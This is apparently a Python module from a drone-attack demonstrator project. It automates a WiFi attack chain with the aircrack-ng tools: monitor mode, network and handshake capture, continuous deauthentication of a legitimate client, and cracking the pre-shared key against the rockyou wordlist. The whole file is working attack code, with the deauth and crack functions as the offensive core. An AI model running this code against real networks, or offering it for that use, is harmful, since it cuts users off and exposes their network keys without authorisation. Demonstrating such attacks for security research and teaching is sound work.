#!/usr/bin/env python3
# -*- coding: utf-8 -*-

##############################################################################
# Owner     : Expleo Group
# Author    : Tarek AZAIZ
# Project   : Drones Attack Demonstrator
# Subject   : Useful tools for monitoring and dumping WiFi networks
# Version   : 0.1
# Created   : 2022/03/31
# Modified  : 2022/05/04
##############################################################################

import subprocess
import glob

from pwn import *
from ..config import *

def check_kill(hide_output=True):
    """
    perform a preventive kill of processes that could cause troubles
    during the monitoring
    """
    cmd = ['sudo', 'airmon-ng', 'check', 'kill']
    if DEBUG: print_cmd(cmd)
    subprocess.run(cmd, capture_output=hide_output)



def restart_nw(hide_output=True):
    """
    restart the network manager
    """
    #progress = log.progress("Restarting network...")
    cmd = ['sudo', 'systemctl', 'restart', 'NetworkManager']
    if DEBUG: print_cmd(cmd)
    subprocess.run(cmd, capture_output=hide_output)
    #progress .success()


def enable_interf(interface=MNG_INTERF, hide_output=True):
    """
    start interface
    """
    #progress = log.progress("Enabling interface '" + str(interface) + "'...")
    cmd = ['sudo', 'ip', 'link', 'set', interface, 'up']
    if DEBUG: print_cmd(cmd)
    subprocess.run(cmd, capture_output=hide_output)
    #progress .success()


def disable_interf(interface=MNG_INTERF, hide_output=True):
    """
    stop interface
    """
    #progress = log.progress("Disabling interface '" + str(interface) + "'...")
    cmd = ['sudo', 'ip', 'link', 'set', interface, 'down']
    if DEBUG: print_cmd(cmd)
    subprocess.run(cmd, capture_output=hide_output)
    #progress .success()


def restore_interf(interf=MNG_INTERF, hide_output=True):
    """
    restore interf initial state (set it back to managed mode)
    """

    #progress = log.progress("Restoring '"+interf+"' initial state...")
    stop_mon(MON_INTERF)
    disable_interf(MNG_INTERF)
    restart_nw()
    enable_interf(interf)
    #progress .success()



def start_mon(channel='', interface=MNG_INTERF, hide_output=True):
    """
    enable monitor mode on <interface> and <channel>
    """
    log_str = "Enabling monitor mode on '"+interface+"' interface"
    if (channel != ''):
        log_str += " and on channel "+channel
    try:
        #progress = log.progress(log_str)
        check_kill()
        cmd = ['sudo', 'airmon-ng', 'start', interface, channel]
        if DEBUG: print_cmd(cmd)
        subprocess.run(cmd, capture_output=hide_output)

    except Exception as e:
        #progress .failure("Error while switching to monitoring mode: ", format(e))
        raise(e)
    #progress .success()


def stop_mon(interface=MON_INTERF, hide_output=True):
    """
    disable monitor mode on <interface> and <channel>
    """
    try:
        #progress = log.progress("Disabling monitor mode on '"+interface+"' interface")
        cmd = ['sudo', 'airmon-ng', 'stop', interface]
        if DEBUG: print_cmd(cmd)
        subprocess.run(cmd, capture_output=hide_output)
    except Exception as e:
        #progress .failure("Error while disabling ", interface, " interface: ", format(e))
        raise(e)
    #progress .success()



def dump_all_nw(interface=MON_INTERF, duration=NW_DUMP_DURATION, hide_output = False):
    """
    capture packets using airodump-ng with <interface>
    during <duration> seconds and write the result to a prefixed csv file
    """
    dump_file = NW_DUMP_DIR+NW_DUMP_FILE_PREFIX
    progress = log.progress("Dumping all wifi networks with interface '"
        +interface+ "' during "+str(duration)+" seconds...")    
    try:
        # remove previous dump files
        rm_dump_files(dump_file+'*')
        # perform airodump
        cmd = ['sudo', 'airodump-ng', interface
            , '-w', dump_file, '--output-format', 'csv'
            ,'-b', 'abg', '--berlin', '60000', '-M']
        if DEBUG: print_cmd(cmd)
        subprocess.run(cmd, timeout=duration, capture_output = hide_output)
    except subprocess.TimeoutExpired:
        pass
    except Exception as e:
        progress .failure("Error while dumping networks: ", format(e))
        raise(e)
    

    progress .success()


def dump_specific_nw(bssid, channel, interface=MON_INTERF, duration=CLI_DUMP_DURATION, hide_output=True):
    """
    capture packets using airodump-ng with <interface>
    during <duration> seconds and write the result to a prefixed csv file
    """
    dump_file = CLI_DUMP_DIR+CLI_DUMP_FILE_PREFIX
    progress = log.progress("Dumping access point with BSSID = "+str(bssid)
        +" on channel "+str(channel)+ " with interface '" +interface+ "' during "+str(duration)+" seconds...")
    try:
        # remove previous dump files
        rm_dump_files(dump_file+'*')
        # perform airodump
        cmd = ['sudo', 'airodump-ng', interface, '-M', '-c', channel, '-d', bssid
            , '-w', CLI_DUMP_DIR+CLI_DUMP_FILE_PREFIX, '--output-format', 'csv,pcap']
        if DEBUG: print_cmd(cmd)
        subprocess.run(cmd, timeout=duration, capture_output=hide_output)
    except subprocess.TimeoutExpired:
        pass
    except Exception as e:
        progress .failure("Error while dumping ", str(bssid), " acess point: ", format(e))
        raise(e)

    progress .success()


def deauth(target_nw_bssid, target_cli_bssid, target_essid
    , mon_interf=MON_INTERF):
    """
    Deauthenticate a legitime user frome a wifi network
    """
    progress = log.progress("Deauthenticating the legitime user from the '"
        +target_essid+"' wifi network...")

    cmd = ['sudo', 'aireplay-ng', '--deauth', '0'
        , '-a', target_nw_bssid, '-c', target_cli_bssid
        , mon_interf]
    if DEBUG: print_cmd(cmd)
    try:
        subprocess.run(cmd, capture_output=True, timeout=10)
    except subprocess.TimeoutExpired:
        pass
    except Exception as e:
        progress .failure("Error while trying to deauthenticate: ", format(e))
        raise(e)
    
    progress .success()


def crack(bssid, essid):
    """
    Try to crack a pre-shared key (PSK) of a target wifi network
    """
    progress = log.progress("Cracking the '"
        +essid+"' wifi network...")
    
    cmd = ['sudo', 'aircrack-ng', '-w', './res/dict/rockyou.txt'
    , '-b', bssid, CAP_CLI_DUMP]
    if DEBUG: print_cmd(cmd)

    try:
        subprocess.run(cmd, capture_output=False)#True, timeout=10)
    except subprocess.TimeoutExpired:
        pass
    except Exception as e:
        progress .failure("Error during wifi cracking interface: ", format(e))
        raise(e)

    progress.success()


def rm_dump_files(target):
    for f in glob.glob(target):
        os.remove(f)


def print_cmd(cmd):
    for w in cmd:
        print(w, end=" ")
    print("\n")